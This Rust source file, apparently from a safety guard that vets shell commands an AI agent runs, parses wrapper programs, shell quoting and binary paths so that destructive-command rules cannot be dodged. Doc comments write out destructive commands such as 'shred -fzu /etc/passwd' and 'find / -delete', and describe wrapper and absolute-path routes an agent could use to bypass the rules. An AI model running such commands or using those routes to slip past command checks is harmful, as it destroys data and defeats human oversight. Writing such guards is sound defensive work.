            .strip_prefix("--class=")
            .or_else(|| word.strip_prefix("--classdata="))
            .is_some_and(|value| !value.is_empty())
        {
            index += 1;
            continue;
        }
        if let Some(short) = word.strip_prefix('-').filter(|short| !short.is_empty()) {
            let bytes = short.as_bytes();
            let mut position = 0usize;
            let mut consume_next = false;
            while position < bytes.len() {
                match bytes[position] {
                    b't' => position += 1,
                    b'c' | b'n' => {
                        consume_next = position + 1 == bytes.len();
                        position = bytes.len();
                    }
                    _ => return None,
                }
            }
            if consume_next {
                wrapper_word(command, tokens, index + 1)?;
            }
            index += 1 + usize::from(consume_next);
            continue;
        }
        return Some(index);
    }
    None
}

fn setsid_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if wrapper_terminal_option(&word) {
            return None;
        }
        if matches!(word.as_str(), "--ctty" | "--fork" | "--wait")
            || word.strip_prefix('-').is_some_and(|flags| {
                !flags.is_empty() && flags.bytes().all(|b| matches!(b, b'c' | b'f' | b'w'))
            })
        {
            index += 1;
            continue;
        }
        return (!word.starts_with('-')).then_some(index);
    }
    None
}

fn timeout_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            index += 1;
            break;
        }
        if wrapper_terminal_option(&word) {
            return None;
        }
        if matches!(
            word.as_str(),
            "-f" | "--foreground" | "-p" | "--preserve-status" | "-v" | "--verbose"
        ) {
            index += 1;
            continue;
        }
        if matches!(word.as_str(), "-k" | "--kill-after" | "-s" | "--signal") {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if word
            .strip_prefix("--kill-after=")
            .or_else(|| word.strip_prefix("--signal="))
            .is_some_and(|value| !value.is_empty())
            || word
                .strip_prefix("-k")
                .or_else(|| word.strip_prefix("-s"))
                .is_some_and(|value| !value.is_empty())
        {
            index += 1;
            continue;
        }
        if let Some(consume_next) = timeout_flag_cluster(&word) {
            if consume_next {
                wrapper_word(command, tokens, index + 1)?;
            }
            index += 1 + usize::from(consume_next);
            continue;
        }
        break;
    }
    // DURATION is a number with an optional unit, never an option word. Taking
    // an option this parser does not model (a long-option abbreviation such as
    // `--sig`, an unknown letter) for the duration made the real duration the
    // program.
    if wrapper_word(command, tokens, index)?.starts_with('-') {
        return None;
    }
    let command_index = index.checked_add(1)?;
    wrapper_word(command, tokens, command_index)?;
    Some(command_index)
}

/// A getopt cluster of `timeout` flags: `-f`/`-p`/`-v`, optionally ending in
/// `-k` or `-s`, whose value is the rest of the word or, when the letter ends
/// the word, the next word (returned as `Some(true)`). `None` when the word is
/// not such a cluster.
fn timeout_flag_cluster(word: &str) -> Option<bool> {
    let flags = word.strip_prefix('-').filter(|flags| !flags.is_empty())?;
    for (position, flag) in flags.bytes().enumerate() {
        match flag {
            b'f' | b'p' | b'v' => {}
            b'k' | b's' => return Some(position + 1 == flags.len()),
            _ => return None,
        }
    }
    Some(false)
}

fn stdbuf_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if wrapper_terminal_option(&word) {
            return None;
        }
        if matches!(
            word.as_str(),
            "-i" | "--input" | "-o" | "--output" | "-e" | "--error"
        ) {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if ["--input=", "--output=", "--error=", "-i", "-o", "-e"]
            .iter()
            .any(|prefix| {
                word.strip_prefix(prefix)
                    .is_some_and(|value| !value.is_empty())
            })
        {
            index += 1;
            continue;
        }
        return (!word.starts_with('-')).then_some(index);
    }
    None
}

fn chrt_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    let mut priority_optional = false;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            index += 1;
            break;
        }
        if wrapper_terminal_option(&word)
            || matches!(word.as_str(), "-m" | "--max" | "-p" | "--pid")
        {
            return None;
        }
        if matches!(
            word.as_str(),
            "-o" | "--other"
                | "-b"
                | "--batch"
                | "-i"
                | "--idle"
                | "-d"
                | "--deadline"
                | "-e"
                | "--ext"
        ) {
            priority_optional = true;
            index += 1;
            continue;
        }
        if matches!(
            word.as_str(),
            "-f" | "--fifo" | "-r" | "--rr" | "-R" | "--reset-on-fork" | "-a" | "--all-tasks"
        ) {
            index += 1;
            continue;
        }
        if matches!(
            word.as_str(),
            "-T" | "--sched-runtime" | "-P" | "--sched-period" | "-D" | "--sched-deadline"
        ) {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if [
            "--sched-runtime=",
            "--sched-period=",
            "--sched-deadline=",
            "-T",
            "-P",
            "-D",
        ]
        .iter()
        .any(|prefix| {
            word.strip_prefix(prefix)
                .is_some_and(|value| !value.is_empty())
        }) {
            index += 1;
            continue;
        }
        if word.strip_prefix('-').is_some_and(|flags| {
            !flags.is_empty()
                && flags
                    .bytes()
                    .all(|flag| matches!(flag, b'o' | b'b' | b'i' | b'd' | b'e'))
        }) {
            priority_optional = true;
            index += 1;
            continue;
        }
        if word.strip_prefix('-').is_some_and(|flags| {
            !flags.is_empty()
                && flags
                    .bytes()
                    .all(|flag| matches!(flag, b'f' | b'r' | b'R' | b'a'))
        }) {
            index += 1;
            continue;
        }
        break;
    }

    let first = wrapper_word(command, tokens, index)?;
    let first_is_priority = first
        .strip_prefix(['+', '-'])
        .unwrap_or(&first)
        .bytes()
        .all(|byte| byte.is_ascii_digit());
    if first_is_priority {
        let command_index = index.checked_add(1)?;
        wrapper_word(command, tokens, command_index)?;
        Some(command_index)
    } else if priority_optional && !first.starts_with('-') {
        // An option word here is one the loop does not model (such as the
        // `--fi` abbreviation of `--fifo`), not the program.
        Some(index)
    } else {
        None
    }
}

fn busybox_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let applet = wrapper_word(command, tokens, 1)?;
    (!applet.starts_with('-')).then_some(1)
}

/// A mise option that consumes the following token as its value. Shared with
/// the sanitizer's `MiseExec` wrapper state so the two engines cannot
/// diverge (v0.9.1 review). When a flag's arity is uncertain, model it as
/// value-taking only when documented so: a boolean flag wrongly modeled as
/// value-taking would swallow the real command word (a false negative),
/// while a value-taking flag wrongly modeled as boolean merely evaluates the
/// value as extra command text (a false positive).
#[must_use]
pub(crate) fn mise_option_takes_separate_value(word: &str) -> bool {
    matches!(
        word,
        "-C" | "--cd" | "-E" | "--env" | "-j" | "--jobs" | "-P" | "--profile" | "--allow-net"
    )
}

/// A mise flag (global or `exec`) that consumes nothing further, plus glued
/// `--opt=value` forms.
#[must_use]
pub(crate) fn mise_flag_consumes_nothing(word: &str) -> bool {
    word.strip_prefix("--")
        .is_some_and(|rest| rest.contains('='))
        || matches!(
            word,
            "--raw"
                | "-v"
                | "--verbose"
                | "-q"
                | "--quiet"
                | "-y"
                | "--yes"
                | "-n"
                | "--no"
                | "--locked"
                | "--silent"
                | "--debug"
                | "--trace"
                | "--deny-net"
                | "--deny-all"
                | "--no-deps"
                | "--fresh-env"
        )
}

/// `mise [GLOBAL FLAGS] exec [TOOL@VERSION]... [--] <command>...` (and the
/// `mise x` alias) runs its trailing argv as a command (issue #257).
///
/// Global flags may precede the subcommand (`mise -v exec -- cmd` — v0.9.1
/// review false negative: the subcommand was only recognized at argv index
/// 1). The wrapped command starts at the first bare word (no `@`, not
/// `-`-leading) or after an explicit `--`; a *later* `--` belongs to the
/// wrapped command's own argv (e.g. a git pathspec separator), so the scan
/// must never run past a bare word. An unknown `-`-leading option bails
/// rather than guessing whether the following word is its value or the
/// command; `-c/--command` (an inline shell string) also bails.
fn mise_exec_wrapper_command_index(command: &str, tokens: &[NormalizeToken]) -> Option<usize> {
    let mut index = 1usize;
    let subcommand = loop {
        let word = wrapper_word(command, tokens, index)?;
        if wrapper_terminal_option(&word) {
            return None;
        }
        if mise_option_takes_separate_value(&word) {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if mise_flag_consumes_nothing(&word) {
            index += 1;
            continue;
        }
        if word.starts_with('-') {
            return None;
        }
        break word;
    };
    if subcommand != "exec" && subcommand != "x" {
        return None;
    }
    index += 1;
    while let Some(word) = wrapper_word(command, tokens, index) {
        if word == "--" {
            return (index + 1 < tokens.len()).then_some(index + 1);
        }
        if wrapper_terminal_option(&word) {
            return None;
        }
        if mise_option_takes_separate_value(&word) {
            wrapper_word(command, tokens, index + 1)?;
            index += 2;
            continue;
        }
        if mise_flag_consumes_nothing(&word) {
            index += 1;
            continue;
        }
        if word.starts_with('-') {
            // Unknown option (including `-c/--command`, whose payload is an
            // inline shell string): arity/semantics unmodeled — bail rather
            // than guess.
            return None;
        }
        if word.contains('@') {
            // TOOL@VERSION spec.
            index += 1;
            continue;
        }
        // First bare word: the wrapped command starts here.
        return Some(index);
    }
    None
}

/// The executable basenames [`strip_posix_execution_frontend`] models. When a
/// command starts with one of these but the stripper bails (dynamic option
/// value, unmodeled flag), the wrapped command still executes at runtime, so
/// deny-direction analyses must not downgrade its words to argv data (#260).
pub(crate) fn is_posix_execution_frontend_basename(basename: &str) -> bool {
    matches!(
        basename,
        "exec"
            | "nohup"
            | "time"
            | "nice"
            | "ionice"
            | "setsid"
            | "timeout"
            | "stdbuf"
            | "chrt"
            | "busybox"
            | "mise"
    )
}

pub(crate) fn strip_posix_execution_frontend(command: &str) -> Option<(&str, &'static str)> {
    let trimmed = command.trim_start();
    let tokens = tokenize_for_normalization(trimmed);
    let executable = wrapper_word(trimmed, &tokens, 0)?;
    let basename = executable.rsplit(['/', '\\']).next().unwrap_or(&executable);
    let mut filesystem_context_changed = false;
    let command_index = match basename {
        "exec" => exec_wrapper_command_index(trimmed, &tokens, &mut filesystem_context_changed)?,
        "nohup" => {
            let word = wrapper_word(trimmed, &tokens, 1)?;
            if word == "--" {
                2
            } else if word.starts_with('-') {
                return None;
            } else {
                1
            }
        }
        "time" => time_wrapper_command_index(trimmed, &tokens)?,
        "nice" => nice_wrapper_command_index(trimmed, &tokens)?,
        "ionice" => ionice_wrapper_command_index(trimmed, &tokens)?,
        "setsid" => setsid_wrapper_command_index(trimmed, &tokens)?,
        "timeout" => timeout_wrapper_command_index(trimmed, &tokens)?,
        "stdbuf" => stdbuf_wrapper_command_index(trimmed, &tokens)?,
        "chrt" => chrt_wrapper_command_index(trimmed, &tokens)?,
        "busybox" => busybox_wrapper_command_index(trimmed, &tokens)?,
        "mise" => mise_exec_wrapper_command_index(trimmed, &tokens)?,
        _ => return None,
    };
    let remaining = wrapper_command_suffix(trimmed, &tokens, command_index)?;
    (!remaining.is_empty() && !starts_with_shell_redirection(remaining)).then_some((
        remaining,
        match basename {
            "exec" => "exec",
            "nohup" => "nohup",
            "time" => "time",
            "nice" => "nice",
            "ionice" => "ionice",
            "setsid" => "setsid",
            "timeout" => "timeout",
            "stdbuf" => "stdbuf",
            "chrt" => "chrt",
            "busybox" => "busybox",
            "mise" => "mise-exec",
            _ => unreachable!("wrapper basename was matched above"),
        },
    ))
}

/// Strip a POSIX execution frontend only when every preceding option has
/// unambiguous operand arity. Informational modes, process-selection modes,
/// dynamic tokens, unknown options, and missing commands remain unchanged.
fn strip_execution_wrapper(command: &str) -> Option<(String, StrippedWrapper)> {
    let trimmed = command.trim_start();
    let (remaining, wrapper_type) = strip_posix_execution_frontend(trimmed)?;
    let stripped_text = trimmed[..trimmed.len() - remaining.len()]
        .trim_end()
        .to_string();
    Some((
        remaining.to_string(),
        StrippedWrapper {
            wrapper_type,
            stripped_text,
        },
    ))
}

pub(crate) fn starts_with_shell_redirection(s: &str) -> bool {
    let bytes = s.trim_start().as_bytes();
    if bytes.is_empty() {
        return false;
    }

    if matches!(bytes[0], b'>' | b'<') || bytes.starts_with(b"&>") {
        return true;
    }

    let mut idx = 0;
    while idx < bytes.len() && bytes[idx].is_ascii_digit() {
        idx += 1;
    }

    idx > 0 && idx < bytes.len() && matches!(bytes[idx], b'>' | b'<')
}

#[must_use]
pub fn consume_word_token(bytes: &[u8], i: usize, len: usize) -> usize {
    consume_word_token_inner(bytes, i, len, false, false, &mut BraceLookup::default())
}

/// [`consume_word_token`] for a loop over the words of one input: the
/// `braces` state is shared across the loop so a run of unclosed `${` is read
/// to the end once, not once per word.
fn consume_word_token_with(bytes: &[u8], i: usize, len: usize, braces: &mut BraceLookup) -> usize {
    consume_word_token_inner(bytes, i, len, false, false, braces)
}

/// Consume one POSIX argv word, excluding adjacent local redirections.
/// Normalization deliberately keeps redirections in its token view; program
/// extraction needs the argv boundary, but must use the same quote walker.
pub(crate) fn consume_posix_word_token(bytes: &[u8], i: usize, len: usize) -> usize {
    consume_word_token_inner(bytes, i, len, true, true, &mut BraceLookup::default())
}

// Keep a parameter expansion inside `$(...)` whole: punctuation inside
// `${...}` is not a shell separator. Reuse the context reader so quotes,
// nested parameters and command substitutions have the same boundaries here.
// It reads the bytes directly: a UTF-8 check of the whole input per `${`
// would make a run of them quadratic.
fn consume_word_braced_parameter(bytes: &[u8], i: usize, len: usize) -> usize {
    crate::context::consume_braced_parameter(&bytes[..len], i).0
}

/// Whether a `${` may still close. Looking for its `}` reads ahead, to the
/// end of the input when none closes it; such a `${` is a shell syntax error.
/// After one, later `${` are read as plain text, as on the base and as the
/// segmenter does (`ParameterExpansion::unclosed`), so a run of them stays
/// linear across a whole tokenization, not only within one word.
#[derive(Default)]
struct BraceLookup {
    unclosed: bool,
}

impl BraceLookup {
    /// End of the `${…}` at `i` through its matching `}`, within
    /// `bytes[..len]` (see [`crate::context::braced_parameter_span`]); `None`
    /// when it is not one, when no `}` closes it, or once an earlier one did
    /// not close.
    fn end(&mut self, bytes: &[u8], i: usize, len: usize, in_double_quotes: bool) -> Option<usize> {
        if self.unclosed || i + 1 >= len || bytes[i] != b'$' || bytes[i + 1] != b'{' {
            return None;
        }
        let close = crate::context::braced_parameter_span(&bytes[..len], i, in_double_quotes);
        self.unclosed = close.is_none();
        close
    }
}

/// A `${…}` is one piece of the word through its matching `}`, looked up
/// through `braces` (see [`BraceLookup`]).
fn consume_word_token_inner(
    bytes: &[u8],
    mut i: usize,
    len: usize,
    stop_at_redirect: bool,
    posix_blanks: bool,
    braces: &mut BraceLookup,
) -> usize {
    while i < len {
        let b = bytes[i];

        if if posix_blanks {
            matches!(b, b' ' | b'\t' | b'\n')
        } else {
            b.is_ascii_whitespace()
        } {
            break;
        }

        if b == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
            i = consume_shell_paren_construct(bytes, i + 2, len);
            continue;
        }

        // `${…}` is one piece of the word through its matching `}`: a blank
        // in it is no word break and a `#` in it is no comment (`x=${y:- #}`).
        if b == b'$'
            && let Some(close) = braces.end(bytes, i, len, false)
        {
            i = close;
            continue;
        }

        if matches!(b, b'<' | b'>') && i + 1 < len && bytes[i + 1] == b'(' {
            i = consume_shell_paren_construct(bytes, i + 2, len);
            continue;
        }

        if stop_at_redirect && matches!(b, b'<' | b'>') {
            break;
        }

        if b == b'&' && i + 1 < len && bytes[i + 1] == b'>' {
            if stop_at_redirect {
                break;
            }
            i += 2;
            if i < len && bytes[i] == b'>' {
                i += 1;
            }
            continue;
        }

        if matches!(b, b'|' | b';' | b'&' | b'(' | b')') {
            break;
        }

        match b {
            b'$' if crate::context::ansi_c_quote_starts_at(bytes, i) => {
                // ANSI-C quotes are one segment of the same word. An escaped
                // apostrophe does not end that segment (issue #570).
                i += 2;
                while i < len && bytes[i] != b'\'' {
                    i = if bytes[i] == b'\\' {
                        (i + 2).min(len)
                    } else {
                        i + 1
                    };
                }
                i = (i + 1).min(len);
            }
            b'`' => {
                // Preserve a complete substitution for the fallible decoder;
                // never pretend the prefix before its whitespace is static.
                i += 1;
                while i < len && bytes[i] != b'`' {
                    i = if bytes[i] == b'\\' {
                        (i + 2).min(len)
                    } else {
                        i + 1
                    };
                }
                i = (i + 1).min(len);
            }
            b'\\' => {
                // Handle CRLF escape (consumes 3 bytes: \, \r, \n)
                if i + 2 < len && bytes[i + 1] == b'\r' && bytes[i + 2] == b'\n' {
                    i += 3;
                } else {
                    // Skip escaped byte. This is conservative for UTF-8.
                    i = (i + 2).min(len);
                }
            }
            b'\'' => {
                // Single-quoted segment
                i += 1;
                while i < len && bytes[i] != b'\'' {
                    i += 1;
                }
                if i < len {
                    i += 1;
                }
            }
            b'"' => {
                // Double-quoted segment
                i += 1;
                while i < len {
                    match bytes[i] {
                        b'"' => {
                            i += 1;
                            break;
                        }
                        b'\\' => {
                            i = (i + 2).min(len);
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            i = consume_shell_paren_construct(bytes, i + 2, len);
                        }
                        // Quotes nest inside `${…}`: `"${y:-" #"}"` is one string.
                        b'$' if let Some(close) = braces.end(bytes, i, len, true) => {
                            i = close;
                        }
                        _ => {
                            i += 1;
                        }
                    }
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    i
}

/// The end of the `$(…)`, `<(…)` or `>(…)` (or `$((…))`) whose body starts
/// at `i`: the byte after the `)` that closes it, or `len`. The body is read
/// as command text (see [`CommandText`]).
pub(crate) fn consume_shell_paren_construct(bytes: &[u8], mut i: usize, len: usize) -> usize {
    let mut command_text = CommandText::new(bytes, i);
    let mut depth = 1usize;

    while i < len {
        if let CommandTextStep::Continue(next) = command_text.step(&bytes[..len], i) {
            i = next;
            continue;
        }
        match bytes[i] {
            b'$' if i + 1 < len && bytes[i + 1] == b'{' => {
                i = consume_word_braced_parameter(bytes, i, len);
            }
            b'(' => {
                depth += 1;
                i += 1;
            }
            b')' => {
                depth = depth.saturating_sub(1);
                i += 1;
                if depth == 0 {
                    return i;
                }
            }
            b'\\' => {
                i = (i + 2).min(len);
            }
            b'\'' => {
                i += 1;
                while i < len && bytes[i] != b'\'' {
                    i += 1;
                }
                if i < len {
                    i += 1;
                }
            }
            b'"' => {
                i += 1;
                while i < len {
                    match bytes[i] {
                        b'"' => {
                            i += 1;
                            break;
                        }
                        b'\\' => {
                            i = (i + 2).min(len);
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'{' => {
                            i = consume_word_braced_parameter(bytes, i, len);
                        }
                        b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                            i = consume_shell_paren_construct(bytes, i + 2, len);
                        }
                        _ => {
                            i += 1;
                        }
                    }
                }
            }
            b'$' if i + 1 < len && bytes[i + 1] == b'(' => {
                i = consume_shell_paren_construct(bytes, i + 2, len);
            }
            _ => {
                i += 1;
            }
        }
    }

    len
}

/// The words of the command text in a `$(…)`, `<(…)` or `>(…)` body, as
/// far as the scanners that look for its closing `)` need them.
///
/// The shell reads such a body as command text: a `#` that starts a word
/// starts a comment to the end of the line, so a `)` or quote in it closes
/// or opens nothing, and the `)` that ends a `case` pattern (and the
/// optional `(` before one) ends the pattern, not the substitution. So
/// `x=$(echo a # )` LF `) printf …` and `x=$(case a in a) echo;; esac)
/// printf …` are each one word before `printf`, in bash 4 and later, dash
/// and zsh. Bash 3.2 ends both at the first `)` and then reports a syntax
/// error, so it runs nothing of the line. An arithmetic body (`$((…))`)
/// has neither.
pub(crate) struct CommandText {
    /// False for an arithmetic body.
    active: bool,
    at_word_start: bool,
    word_start: Option<usize>,
    command_position: bool,
    cases: Vec<CaseState>,
    /// A heredoc opens in the body. Its lines are data to the shell, which
    /// a scanner that does not know heredocs would read as words: a `case`
    /// there must not hold the substitution open, so case statements are
    /// no longer read.
    heredoc: bool,
}

/// What a scanner does with the byte it gave [`CommandText::step`].
pub(crate) enum CommandTextStep {
    /// Read it as before.
    Read,
    /// Continue at this index: the byte started a comment (the index is the
    /// newline that ends it, or the end), or it is the `(` or `)` around a
    /// case pattern, or a `;;`, `;&` or `;;&`, none of which opens or
    /// closes anything.
    Continue(usize),
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum CaseState {
    /// After `case`, before its subject word.
    Subject,
    /// After the subject, before `in`.
    In,
    /// Reading a pattern list, up to its `)`.
    Pattern,
    /// Reading an arm's commands, up to `;;` or `esac`.
    Body,
}

impl CommandText {
    /// For a body that starts at `start`.
    pub(crate) fn new(bytes: &[u8], start: usize) -> Self {
        Self {
            active: bytes.get(start) != Some(&b'('),
            at_word_start: true,
            word_start: None,
            command_position: true,
            cases: Vec::new(),
            heredoc: false,
        }
    }

    /// Read the byte at `i`, which is outside quotes in the body. Quoted
    /// text, escapes and nested expansions are passed over by the caller
    /// after it reads their first byte here.
    pub(crate) fn step(&mut self, bytes: &[u8], i: usize) -> CommandTextStep {
        if !self.active {
            return CommandTextStep::Read;
        }
        let byte = bytes[i];
        if byte == b'#' && self.at_word_start {
            let end = memchr::memchr(b'\n', &bytes[i..]).map_or(bytes.len(), |at| i + at);
            return CommandTextStep::Continue(end);
        }
        if !matches!(
            byte,
            b' ' | b'\t' | b'\n' | b'\r' | b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>'
        ) {
            self.at_word_start = false;
            self.word_start.get_or_insert(i);
            return CommandTextStep::Read;
        }
        self.end_word(bytes, i);
        match byte {
            b'<' if bytes.get(i + 1) == Some(&b'<') => {
                self.heredoc = true;
                self.cases.clear();
            }
            b'\n' | b'&' | b'|' => self.command_position = true,
            b';' => {
                self.command_position = true;
                if matches!(bytes.get(i + 1), Some(b';' | b'&')) {
                    if let Some(state) = self.cases.last_mut()
                        && *state == CaseState::Body
                    {
                        *state = CaseState::Pattern;
                    }
                    let len = if bytes.get(i + 1) == Some(&b';') && bytes.get(i + 2) == Some(&b'&')
                    {
                        3
                    } else {
                        2
                    };
                    return CommandTextStep::Continue(i + len);
                }
            }
            b'(' | b')' if self.cases.last() == Some(&CaseState::Pattern) => {
                if byte == b')' {
                    *self.cases.last_mut().expect("open case") = CaseState::Body;
                    self.command_position = true;
                }
                return CommandTextStep::Continue(i + 1);
            }
            b'(' => self.command_position = true,
            _ => {}
        }
        CommandTextStep::Read
    }

    /// The word that ends before `at`, if any, read for its role.
    fn end_word(&mut self, bytes: &[u8], at: usize) {
        self.at_word_start = true;
        let Some(start) = self.word_start.take() else {
            return;
        };
        let word = &bytes[start..at];
        let command_position = std::mem::replace(&mut self.command_position, false);
        match self.cases.last().copied() {
            Some(CaseState::Subject) => *self.cases.last_mut().expect("open case") = CaseState::In,
            Some(CaseState::In) => {
                if word == b"in" {
                    *self.cases.last_mut().expect("open case") = CaseState::Pattern;
                } else {
                    // Not a case statement the shell reads; stop reading it.
                    self.cases.pop();
                }
            }
            Some(CaseState::Pattern) => {
                if word == b"esac" {
                    self.cases.pop();
                }
            }
            _ if command_position && word == b"esac" && !self.cases.is_empty() => {
                self.cases.pop();
            }
            _ if command_position && word == b"case" && !self.heredoc => {
                self.cases.push(CaseState::Subject);
            }
            _ if command_position
                && matches!(
                    word,
                    b"if"
                        | b"then"
                        | b"else"
                        | b"elif"
                        | b"while"
                        | b"until"
                        | b"do"
                        | b"{"
                        | b"!"
                        | b"time"
                ) =>
            {
                self.command_position = true;
            }
            _ => {}
        }
    }
}

/// Regex to strip absolute paths from git/rm/find/unlink/truncate binaries.
///
/// Handles both Unix paths (`/path/to/bin/git`) and Windows paths (`C:/path/to/git.exe`).
/// For Windows, matches drive letters (C:) followed by either forward or back slashes.
///
/// `find`, `unlink`, `truncate`, and `shred` are included so the
/// corresponding destructive patterns catch path-prefixed invocations
/// (`/usr/bin/find / -delete`, `/usr/bin/unlink /etc/passwd`,
/// `/usr/bin/truncate -s 0 /etc/passwd`, `/usr/bin/shred -fzu
/// /etc/passwd`). Without this, an agent could bypass the rules by
/// writing the absolute path.
pub static PATH_NORMALIZER: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(concat!(
        r"^(?:",
        // Unix paths ending in bin/
        r"/(?:\S*/)*s?bin/",
        r"|",
        // Windows paths: drive letter followed by path
        // Handles both C:/ and C:\ style paths
        // Uses [^\s]* to match path segments (note: won't handle spaces in paths)
        r"[A-Za-z]:[/\\](?:[^\s/\\]*[/\\])*",
        r")",
        // Capture the binary name. Unix verbs stay case-SENSITIVE; the Windows
        // destructive system exes are matched case-INSENSITIVELY (Windows paths
        // and executable names are case-insensitive), so e.g.
        // `C:\Windows\System32\DiskPart.EXE` normalizes to `DiskPart`, which the
        // windows.* pack patterns then match via their own inline `(?i)` flag.
        // Only path-qualifiable real exes are listed here; cmd builtins
        // (del/rd/rmdir/erase) and PowerShell cmdlets are never path-prefixed.
        r"(rm|git|find|unlink|truncate|shred|tar|dd|mv|(?i:format|diskpart|vssadmin|reg|net|robocopy|cipher|takeown|icacls|fsutil|bcdedit|wmic|schtasks|sc|wsl))",
        // Optional .exe/.com extension (case-insensitive for Windows)
        r"(?i:\.exe|\.com)?",
        // Must be followed by whitespace or end
        r"(?=\s|$)"
    ))
    .unwrap()
});

/// Regex for normalizing quoted paths that may contain spaces.
///
/// Handles commands like:
/// - `"C:/Program Files/Git/bin/git.exe" status` → `git status`
/// - `"/usr/local/bin/git" status` → `git status`
///
/// This regex matches:
/// - Opening double quote
/// - A path (Unix or Windows, may contain spaces)
/// - The binary name (git, rm)
/// - Optional .exe extension
/// - Closing double quote
pub static QUOTED_PATH_NORMALIZER: LazyLock<Regex> = LazyLock::new(|| {
    // Matches quoted paths like "C:/Program Files/Git/bin/git.exe" or "/usr/bin/git"
    // Note: Uses [^"]+ to match path content (may include spaces)
    Regex::new(
        r#"^"(?:[^"]+/|[A-Za-z]:[^"]+[/\\])(rm|git|find|unlink|truncate|shred|tar|dd|mv|(?i:format|diskpart|vssadmin|reg|net|robocopy|cipher|takeown|icacls|fsutil|bcdedit|wmic|schtasks|sc|wsl))(?i:\.exe|\.com)?""#,
    )
    .unwrap()
});

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NormalizeTokenKind {
    Word,
    Separator,
}

#[derive(Debug, Clone)]
pub struct NormalizeToken {
    pub kind: NormalizeTokenKind,
    pub byte_range: Range<usize>,
}

impl NormalizeToken {
    #[inline]
    #[must_use]
    pub fn text<'a>(&self, command: &'a str) -> Option<&'a str> {
        command.get(self.byte_range.clone())
    }
}

pub type NormalizeTokens = SmallVec<[NormalizeToken; 16]>;

/// The shell syntax that produced a raw command token.
///
/// This is intentionally explicit rather than auto-detected: the caller owns
/// the trustworthy execution context (hook, shell adapter, or test harness),
/// while a command string alone is inherently ambiguous.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellDialect {
    Posix,
    PowerShell,
    Cmd,
    Unknown,
}

/// Whether a raw token is shell syntax or opaque user data.
///
/// Only syntax tokens may be decoded. In particular, option values that happen
/// to contain backticks or carets must be passed as [`Self::Data`] so their
/// bytes remain exactly as supplied by the user.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ShellTokenRole {
    Syntax,
    Data,
}

/// Stateful, token-level shell syntax decoder.
///
/// The state is needed only for PowerShell's `--%` stop-parsing token. Create a
/// decoder per command segment. A syntax token whose decoded value is `--%`
/// (including quoted forms) is consumed as shell control syntax
/// ([`Self::decode`] returns `None`). After the stop-parsing token
/// ([`powershell_word_stops_parsing`]; a word that starts with a quote is
/// not one) subsequent tokens are still returned as parser-visible tokens,
/// but byte-for-byte because PowerShell no longer interprets their shell
/// syntax. POSIX syntax-role tokens decode only
/// deterministic quote/escape syntax; unknown and data-role input deliberately
/// remain unchanged.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct ShellTokenDecoder {
    dialect: ShellDialect,
    powershell_stop_parsing: bool,
}

impl ShellTokenDecoder {
    #[must_use]
    pub(crate) const fn new(dialect: ShellDialect) -> Self {
        Self {
            dialect,
            powershell_stop_parsing: false,
        }
    }

    /// Decode one raw token according to its parser role.
    ///
    /// PowerShell backticks escape the following character outside
    /// single-quoted verbatim strings, including inside double quotes. A
    /// backtick immediately before LF or CRLF is a line continuation and both
    /// are removed. Cmd carets remove exactly one escape layer outside double
    /// quotes; carets inside double quotes are literal. POSIX decoding handles
    /// ordinary quote/backslash concatenation plus Bash ANSI-C and locale
    /// quoting, while preserving unresolved expansions. Data tokens are never
    /// decoded by any dialect.
    ///
    /// `None` means that the token is shell-only control syntax and must not be
    /// passed to the downstream argv parser. Currently this is returned only
    /// for a PowerShell syntax token whose decoded value is `--%`. Callers must
    /// continue parsing later tokens: after `--%`, an exact `--delete` remains
    /// visible to Git, while an escaped-looking ``--d`elete`` remains literal.
    #[must_use]
    pub(crate) fn decode<'a>(
        &mut self,
        token: &'a str,
        role: ShellTokenRole,
    ) -> Option<Cow<'a, str>> {
        if role == ShellTokenRole::Data {
            return Some(Cow::Borrowed(token));
        }

        match self.dialect {
            ShellDialect::Posix => Some(decode_posix_syntax_token(token)),
            ShellDialect::Unknown => Some(Cow::Borrowed(token)),
            ShellDialect::PowerShell => {
                if self.powershell_stop_parsing {
                    return Some(Cow::Borrowed(token));
                }
                let decoded = decode_powershell_syntax_token(token);
                if decoded.as_ref() == "--%" {
                    self.powershell_stop_parsing = powershell_word_stops_parsing(token);
                    return None;
                }
                Some(decoded)
            }
            ShellDialect::Cmd => Some(decode_cmd_syntax_token(token)),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum PosixQuote {
    Unquoted,
    Single,
    Double,
}

pub(crate) fn decode_posix_syntax_token(token: &str) -> Cow<'_, str> {
    decode_posix_token(token, false).unwrap_or(Cow::Borrowed(token))
}

/// The value of a literal POSIX argv word. Unlike the syntax matching view,
/// failure is explicit: expansions, translation, and malformed quoting must
/// not be mistaken for a completely recovered inline program (issue #570).
